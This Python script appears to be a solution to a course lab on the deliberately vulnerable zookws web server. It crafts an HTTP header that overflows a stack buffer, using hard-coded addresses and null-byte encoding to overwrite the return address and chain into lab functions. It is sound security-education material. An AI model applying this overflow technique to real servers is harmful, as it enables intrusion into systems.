#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer      = 0x7fffffffda50
stack_rbp         = 0x7fffffffdc80
stack_retaddr     = 0x7fffffffdc88
accidentally_addr = 0x555555556b94
touch_addr        = 0x555555556b9b
filename          = "bad_file.sh"

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def encode_zeros(bytes_old):
    bytes_new = b""
    for i in range(len(bytes_old)):
        if bytes_old[i] == 0:
            # url_decode() decodes b"%GG" as null byte
            bytes_new += b"%GG"
        else:
            bytes_new += bytes_old[i:i+1]
    return bytes_new

def build_exploit(shellcode):
    value = b"A" * (stack_rbp - stack_buffer) + \
            struct.pack("<Q", stack_rbp) + \
            struct.pack("<Q", accidentally_addr) + \
            struct.pack("<Q", stack_buffer) + \
            struct.pack("<Q", touch_addr)

    val1 = encode_zeros(value)
    val2 = urllib.parse.quote(filename).encode('ascii')

    req = b"GET / HTTP/1.0\r\n" + \
          b"Key1: %b\r\n" % val1 + \
          b"Key2: %b\r\n" % val2 + \
          b"\r\n"

    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

